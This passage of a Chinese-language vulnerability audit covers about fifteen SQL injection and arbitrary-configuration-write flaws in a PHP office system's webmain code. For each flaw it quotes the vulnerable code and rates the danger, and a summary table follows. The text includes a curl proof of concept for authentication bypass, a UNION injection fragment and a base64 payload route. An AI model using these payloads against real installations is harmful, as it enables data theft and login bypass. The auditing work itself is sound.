class="variable">$sqla</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$acta</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">arrvalue</span>(<span class="variable">$sqla</span>,<span class="number">2</span>,<span class="string">&#x27;1=1&#x27;</span>);</span><br><span class="line">    <span class="variable">$wher</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$wher</span>);  <span class="comment">// ⚠️ 仅替换 $ 为 &quot;</span></span><br><span class="line">    <span class="variable">$rowa</span> = <span class="title function_ invoke__">m</span>(<span class="variable">$sqla</span>[<span class="number">0</span>])-&gt;<span class="title function_ invoke__">getall</span>(<span class="variable">$wher</span>,<span class="variable">$sqla</span>[<span class="number">1</span>]);  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rowa</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li>可控表名、字段、WHERE条件</li><li><strong>可读取任意表的任意数据</strong></li></ul><p><strong>路由</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?a=getselectdata&amp;m=input&amp;d=flow&amp;ajaxbool=true&amp;actstr=[base64_payload]</span><br></pre></td></tr></table></figure><hr><h3 id="【2】tableAction-php-savedbupurlAjax-任意配置写入-⭐⭐⭐⭐"><a href="#【2】tableAction-php-savedbupurlAjax-任意配置写入-⭐⭐⭐⭐" class="headerlink" title="【2】tableAction.php - savedbupurlAjax() - 任意配置写入 ⭐⭐⭐⭐"></a>【2】tableAction.php - savedbupurlAjax() - 任意配置写入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/system/table/tableAction.php:149</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">savedbupurlAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dz&#x27;</span>);</span><br><span class="line">    <span class="variable">$dz</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$dz</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="title function_ invoke__">m</span>(<span class="string">&#x27;option&#x27;</span>)-&gt;<span class="title function_ invoke__">setval</span>(<span class="string">&#x27;dbupurl&#x27;</span>, <span class="variable">$dz</span>);  <span class="comment">// ⚠️ 无过滤，直接写入</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>setval代码</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// optionModel.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setval</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$val</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$name</span>=<span class="literal">null</span>, <span class="variable">$isub</span>=<span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;num&#x27;</span> =&gt; <span class="variable">$num</span>,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span> =&gt; <span class="variable">$val</span>,  <span class="comment">// ⚠️ 直接插入数据库</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li>可写入任意系统配置</li><li>可能导致RCE或权限绕过</li></ul><hr><h3 id="【3】loginAction-php-jinxwqqtbAction-Mobile-SQL注入-（分享）⭐⭐⭐⭐⭐"><a href="#【3】loginAction-php-jinxwqqtbAction-Mobile-SQL注入-（分享）⭐⭐⭐⭐⭐" class="headerlink" title="【3】loginAction.php - jinxwqqtbAction() - Mobile SQL注入 （分享）⭐⭐⭐⭐⭐"></a>【3】loginAction.php - jinxwqqtbAction() - Mobile SQL注入 （<strong>分享</strong>）⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/loginAction.php:304</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jinxwqqtbAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="variable">$shouji</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;shouji&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$userid</span>  = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;userid&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$urs</span>     = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`mobile`=&#x27;<span class="subst">$shouji</span>&#x27; AND `status`=1&quot;</span>);  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li><code>$shouji</code> 可注入SQL</li><li>可以绕过身份认证</li></ul><p><strong>POC</strong>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shouji=$(<span class="built_in">echo</span> -n <span class="string">&quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span> | <span class="built_in">base64</span>)</span><br><span class="line">curl <span class="string">&quot;http://target/index.php?a=jinxwqqtb&amp;m=login&amp;d=api&amp;ajaxbool=true&amp;shouji=<span class="variable">$&#123;shouji&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="【4】loginAction-php-yzmAction-Mobile-SQL注入2-⭐⭐⭐⭐⭐"><a href="#【4】loginAction-php-yzmAction-Mobile-SQL注入2-⭐⭐⭐⭐⭐" class="headerlink" title="【4】loginAction.php - yzmAction() - Mobile SQL注入2 ⭐⭐⭐⭐⭐"></a>【4】loginAction.php - yzmAction() - Mobile SQL注入2 ⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/loginAction.php:263</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yzmAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$mobile</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">iscnmobile</span>(<span class="variable">$mobile</span>))<span class="keyword">return</span> <span class="title function_ invoke__">returnerror</span>(<span class="string">&#x27;err2&#x27;</span>);</span><br><span class="line">    <span class="variable">$where</span>  = <span class="string">&quot;`mobile`=&#x27;<span class="subst">$mobile</span>&#x27;&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="comment">// ... m(&#x27;admin&#x27;)-&gt;getone($where)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="【5】goodsModel-php-getpage-Keyword-LIKE注入-⭐⭐⭐⭐"><a href="#【5】goodsModel-php-getpage-Keyword-LIKE注入-⭐⭐⭐⭐" class="headerlink" title="【5】goodsModel.php - getpage() - Keyword LIKE注入 ⭐⭐⭐⭐"></a>【5】goodsModel.php - getpage() - Keyword LIKE注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/goodsModel.php:123</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getpage</span>(<span class="params"><span class="variable">$where</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;sort&#x27;</span>,<span class="variable">$lx</span>=<span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>  = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$key</span>))&#123;</span><br><span class="line">        <span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">        <span class="variable">$where</span>.= <span class="string">&quot; and (a.`name` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`num` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`xinghao` like &#x27;%<span class="subst">$key</span>%&#x27; or a.`guige` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>: 可以在LIKE中注入：<code>%&#39; UNION SELECT ...--</code></p><hr><h3 id="【6-7】crmModel-php-getclientselect-getclientpage-LIKE注入-⭐⭐⭐⭐"><a href="#【6-7】crmModel-php-getclientselect-getclientpage-LIKE注入-⭐⭐⭐⭐" class="headerlink" title="【6-7】crmModel.php - getclientselect() &#x2F; getclientpage() - LIKE注入 ⭐⭐⭐⭐"></a>【6-7】crmModel.php - getclientselect() &#x2F; getclientpage() - LIKE注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/crmModel.php:17,41</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第17行</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// ⚠️ 拼接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第41行</span></span><br><span class="line"><span class="variable">$key</span>= <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="variable">$where</span>.= <span class="string">&quot; and (`name` like &#x27;%<span class="subst">$key</span>%&#x27; or `unitname` like &#x27;%<span class="subst">$key</span>%&#x27;)&quot;</span>;  <span class="comment">// ⚠️ 拼接</span></span><br></pre></td></tr></table></figure><hr><h3 id="【8】loginModel-php-cookie登录-Token-SQL注入-⭐⭐⭐⭐"><a href="#【8】loginModel-php-cookie登录-Token-SQL注入-⭐⭐⭐⭐" class="headerlink" title="【8】loginModel.php - cookie登录 - Token SQL注入 ⭐⭐⭐⭐"></a>【8】loginModel.php - cookie登录 - Token SQL注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/loginModel.php:361</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tokans</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;mo_adminid&#x27;</span>));  <span class="comment">// ⚠️ 解密cookie</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$tokans</span>))&#123;</span><br><span class="line">    <span class="variable">$onrs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;`token`=&#x27;<span class="subst">$tokans</span>&#x27;&quot;</span>,<span class="string">&#x27;`name`,`token`,`id`,`uid`&#x27;</span>);  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>危害</strong>:</p><ul><li>通过cookie注入</li><li>可能绕过登录验证</li></ul><hr><h3 id="【9】uploadAction-php-getwobaAction-分类过滤注入-⭐⭐⭐⭐"><a href="#【9】uploadAction-php-getwobaAction-分类过滤注入-⭐⭐⭐⭐" class="headerlink" title="【9】uploadAction.php - getwobaAction() - 分类过滤注入 ⭐⭐⭐⭐"></a>【9】uploadAction.php - getwobaAction() - 分类过滤注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/uploadAction.php:555</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getwobaAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$fenlei</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fenlei&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="variable">$where</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">getjoinstr</span>(<span class="string">&#x27;a.`receid`&#x27;</span>, <span class="variable">$this</span>-&gt;adminid, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ... 然后拼接到SQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="【10】uploadAction-php-getfileAction-Keyword过滤注入-⭐⭐⭐⭐"><a href="#【10】uploadAction-php-getfileAction-Keyword过滤注入-⭐⭐⭐⭐" class="headerlink" title="【10】uploadAction.php - getfileAction() - Keyword过滤注入 ⭐⭐⭐⭐"></a>【10】uploadAction.php - getfileAction() - Keyword过滤注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/task/api/uploadAction.php:621</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">xssrepstr</span>(<span class="variable">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$key</span>));  <span class="comment">// ⚠️ 只有xssrepstr，没有SQL过滤</span></span><br><span class="line"><span class="variable">$where</span>.=<span class="string">&quot; and `filename` like &#x27;%&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;%&#x27;&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br></pre></td></tr></table></figure><hr><h3 id="【11-13】upgradeAction-php-三个极危SQL直接执行漏洞-⭐⭐⭐⭐⭐"><a href="#【11-13】upgradeAction-php-三个极危SQL直接执行漏洞-⭐⭐⭐⭐⭐" class="headerlink" title="【11-13】upgradeAction.php - 三个极危SQL直接执行漏洞 ⭐⭐⭐⭐⭐"></a>【11-13】upgradeAction.php - 三个极危SQL直接执行漏洞 ⭐⭐⭐⭐⭐</h3><h4 id="11-shengjianssAjax-SQL语句直接执行"><a href="#11-shengjianssAjax-SQL语句直接执行" class="headerlink" title="11. shengjianssAjax() - SQL语句直接执行"></a>11. shengjianssAjax() - SQL语句直接执行</h4><p><strong>文件</strong>: <code>/webmain/system/upgrade/upgradeAction.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$data</span>[<span class="string">&#x27;content&#x27;</span>]);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$type</span>==<span class="number">10</span>)&#123;</span><br><span class="line">    <span class="variable">$sqarr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;ROCKSPLIT&#x27;</span>, <span class="variable">$fcont</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$sqarr</span> <span class="keyword">as</span> <span class="variable">$_sql1</span>)<span class="keyword">if</span>(<span class="variable">$_sql1</span>)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$_sql1</span>,<span class="literal">false</span>);  <span class="comment">// ⚠️ 直接执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="12-shengjifile"><a href="#12-shengjifile" class="headerlink" title="12. shengjifile()"></a>12. shengjifile()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fcont</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$barr</span>[<span class="string">&#x27;data&#x27;</span>]);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="variable">$fcont</span>);  <span class="comment">// ⚠️ 直接传入</span></span><br></pre></td></tr></table></figure><h4 id="13-newinstallinfoAjax"><a href="#13-newinstallinfoAjax" class="headerlink" title="13. newinstallinfoAjax()"></a>13. newinstallinfoAjax()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nwsp</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;path&#x27;</span>));  <span class="comment">// ⚠️ 解密</span></span><br><span class="line"><span class="comment">// ... 读取文件</span></span><br><span class="line"><span class="variable">$bmsg</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;beifen&#x27;</span>)-&gt;<span class="title function_ invoke__">updatefabric</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$mysqlpath</span>), <span class="number">1</span>);  <span class="comment">// ⚠️ 执行</span></span><br></pre></td></tr></table></figure><hr><h3 id="【14】whereModel-php-getstrwhere-WHERE子句注入-⭐⭐⭐⭐"><a href="#【14】whereModel-php-getstrwhere-WHERE子句注入-⭐⭐⭐⭐" class="headerlink" title="【14】whereModel.php - getstrwhere() - WHERE子句注入 ⭐⭐⭐⭐"></a>【14】whereModel.php - getstrwhere() - WHERE子句注入 ⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/model/whereModel.php:231</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getstrwhere</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$uid</span>=<span class="string">&#x27;&#x27;</span>, <span class="variable">$fid</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$str</span>);  <span class="comment">// ⚠️ 解密</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$where</span>==<span class="string">&#x27;all&#x27;</span> || <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;super&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;allsuper&#125;&#x27;</span>) || </span><br><span class="line">        <span class="title function_ invoke__">contain</span>(<span class="variable">$where</span>, <span class="string">&#x27;&#123;company&#125;&#x27;</span>))<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// ... 然后直接用于SQL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>配合使用的地方</strong>（flowModel.php:152）:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$wheresstr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getstrwhere</span>(<span class="variable">$this</span>-&gt;rock-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$rs</span>[<span class="string">&#x27;wheresstr&#x27;</span>]), <span class="variable">$uid</span>, <span class="variable">$fid</span>);</span><br><span class="line"><span class="comment">// ... 直接拼接到SQL</span></span><br></pre></td></tr></table></figure><hr><h3 id="【15】webmainAction-php-limitRows-WHERE-KEYWHERE注入-⭐⭐⭐⭐⭐"><a href="#【15】webmainAction-php-limitRows-WHERE-KEYWHERE注入-⭐⭐⭐⭐⭐" class="headerlink" title="【15】webmainAction.php - limitRows() - WHERE&#x2F;KEYWHERE注入 ⭐⭐⭐⭐⭐"></a>【15】webmainAction.php - limitRows() - WHERE&#x2F;KEYWHERE注入 ⭐⭐⭐⭐⭐</h3><p><strong>文件</strong>: <code>/webmain/webmainAction.php:120</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">limitRows</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$fields</span>=<span class="string">&#x27;*&#x27;</span>,<span class="variable">$wherea</span>=<span class="string">&#x27;1=1&#x27;</span>,<span class="variable">$order</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">    <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;keywhere&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))&#123;</span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$where</span>));  <span class="comment">// ⚠️ 先过滤加密串，再解密</span></span><br><span class="line">        <span class="variable">$where</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$where</span>));  <span class="comment">// ⚠️ filterstr已弃用</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$keywhere</span>))&#123;</span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">uncrypt</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$keywhere</span>));  <span class="comment">// ⚠️ 过滤逻辑错误</span></span><br><span class="line">        <span class="variable">$keywhere</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">covexec</span>(<span class="variable">$keywhere</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$wherea</span> .= <span class="string">&quot; <span class="subst">$where</span> <span class="subst">$keywhere</span>&quot;</span>;  <span class="comment">// ⚠️ 直接拼接</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>问题</strong>:</p><ul><li><strong>先对加密串过滤（无效）</strong></li><li><strong>再解密（恢复SQL关键字）</strong></li><li><strong>然后用已弃用的filterstr（不起作用）</strong></li></ul><hr><h2 id="📊-漏洞统计"><a href="#📊-漏洞统计" class="headerlink" title="📊 漏洞统计"></a>📊 漏洞统计</h2><table><thead><tr><th align="left">序号</th><th align="left">文件</th><th align="left">方法</th><th align="left">解密方式</th><th align="left">危害等级</th><th align="left">是否有过滤</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">inputAction.php</td><td align="left">getselectdataAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">2</td><td align="left">tableAction.php</td><td align="left">savedbupurlAjax</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">3</td><td align="left">loginAction.php</td><td align="left">jinxwqqtbAction</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">4</td><td align="left">loginAction.php</td><td align="left">yzmAction</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">5</td><td align="left">goodsModel.php</td><td align="left">getpage</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">6</td><td align="left">crmModel.php</td><td align="left">getclientselect</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">7</td><td align="left">crmModel.php</td><td align="left">getclientpage</td><td align="left">base64decode</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">8</td><td align="left">loginModel.php</td><td align="left">cookie登录</td><td align="left">uncrypt</td><td align="left">⭐⭐⭐⭐</td><td align="left"><strong>无</strong></td></tr><tr><td align="left">9</td><td align="left">uploadAction.php</td><td align="left">getwobaAction</td><td 